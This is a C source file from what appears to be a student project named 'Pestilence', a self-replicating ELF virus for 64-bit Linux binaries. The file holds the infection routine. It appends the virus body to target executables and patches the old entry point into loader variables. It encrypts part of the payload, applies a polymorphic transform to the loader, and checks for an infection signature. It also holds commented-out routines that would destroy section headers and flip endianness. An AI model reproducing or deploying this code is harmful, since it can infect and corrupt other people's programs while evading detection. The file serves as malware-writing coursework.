/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject_self.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: helmanso <helmanso@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/09 11:45:14 by helmanso          #+#    #+#             */
/*   Updated: 2021/07/28 16:15:15 by helmanso         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/pestilence.h"

void    *clone_target(void *mapped, int size, void *payload, int payload_size)
{
    void *clone;


    if ((clone = mmap_wrapper(NULL, size + payload_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
        return ((void *)-1);
    
    ft_memcpy(clone, mapped, size);
    ft_memcpy(clone + size, payload, payload_size);
    return (clone);
}

void    append_virus(void *mapped, int size, char *file, unsigned long _start_address, unsigned long vsize, Elf64_Addr *old_entry, t_seed *seed)
{
    int fd;
    void    *clone;
    long     vars_offset;
    long offset;
    long encrypt_size;
    t_seed tmp;
    t_seed *tmp2;

    if ((fd = open_wrapper(file, O_WRONLY)) < 0)
        return;
    
    clone = clone_target(mapped, size, (void *)_start_address, (unsigned long)&end - (unsigned long)&virus);
    vars_offset = size + ((unsigned long)&loader_vars - (unsigned long)&virus);

    offset = (unsigned long)&encrypt - (unsigned long)&virus;
    encrypt_size = (unsigned long)&end - (unsigned long)&encrypt;

    ft_memcpy(clone + vars_offset, &old_entry, sizeof(old_entry));
    ft_memcpy(clone +  vars_offset + sizeof(old_entry), &offset, sizeof(offset));
    ft_memcpy(clone + vars_offset + sizeof(old_entry) + sizeof(offset), &encrypt_size, sizeof(encrypt_size));

    if (seed->w == 0)
        get_seed(clone + vars_offset + sizeof(old_entry) + sizeof(offset) + sizeof(encrypt_size), seed);
    encrypt(clone + size + offset, encrypt_size, seed);
    ft_memcpy(clone + vars_offset + sizeof(old_entry) + sizeof(offset) + sizeof(encrypt_size), seed, 16);

    write_wrapper(fd, clone, size);
    ft_memcpy(&tmp, seed, sizeof(t_seed));
    tmp2 = &tmp;
   
    
    // Applied the poly only on the loader, i just can't publish the original code :c
    // disass for loader
    op_c(clone + size, (unsigned long)&loader_vars - (unsigned long)&virus, fd, seed);
    
    write_wrapper(fd, clone + size + (unsigned long)&loader_vars - (unsigned long)&virus, (unsigned long)&decrypt - (unsigned long)&loader_vars);

    // disass for decrypter

  //  op_c(clone + size + (unsigned long)&decrypt - (unsigned long)&virus, (unsigned long)&encrypt - (unsigned long)&decrypt, fd, tmp2);

    // write rest
    write_wrapper(fd, clone + size + (unsigned long)&decrypt - (unsigned long)&virus,  (unsigned long)&encrypt - (unsigned long)&decrypt);
    write_wrapper(fd, clone + size + (unsigned long)&encrypt - (unsigned long)&virus, (unsigned long)&end - (unsigned long)&encrypt);

}

int     check_infected(void *mapped, int size)
{

    char    *str;
    char    signature[] = {'P','e','s','t','i','l','e','n', 'c','e', ' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ',
                            'b','y',' ','h','e','l','m','a','n','s','o','\0'};

    str = (char *)mapped + size - sizeof(signature);
    if (!ft_strcmp(str, signature))
        return (-1);
    return (1);
}

void    sheader_destroy(void *mapped, int size)
{
   
    Elf64_Shdr *section_header;
    Elf64_Ehdr *header_file;
    Elf64_Shdr *section_strtab;
    char *strtab;
    char *found;
    int i;

    header_file = (Elf64_Ehdr *)mapped;
    section_header = (Elf64_Shdr *)(mapped + header_file->e_shoff);
    section_strtab = &section_header[header_file->e_shstrndx];
    strtab = mapped + section_strtab->sh_offset;
    i = 0;
    while (i < header_file->e_shnum)
    {
        found = strtab + section_header[i].sh_name;
        *found = 0;
        i++;
    } 
    header_file->e_shoff = 0;
    header_file->e_shentsize = 0;
    header_file->e_shnum = 0;
    header_file->e_shstrndx = 0;
}

void    endianess_destroy(void *mapped, int size)
{
    Elf64_Ehdr *header_file = (Elf64_Ehdr *)mapped;
    if (header_file->e_ident[EI_DATA] == 1)
        header_file->e_ident[EI_DATA] = 2;
    else if (header_file->e_ident[EI_DATA] == 2)
        header_file->e_ident[EI_DATA] = 1;
    else
        header_file->e_ident[EI_DATA] = 2;

    
}

void    inject_self(void *mapped, int size, char *file, t_seed *seed)
{
    Elf64_Addr *addr;


   // sheader_destroy(mapped, size);
   // endianess_destroy(mapped, size);

    increase_phdr(mapped, size, (unsigned long)&end - (unsigned long)&virus, &addr);
    append_virus(mapped, size, file, (unsigned long)&virus, (unsigned long)&end - (unsigned long)&virus, addr, seed);
}
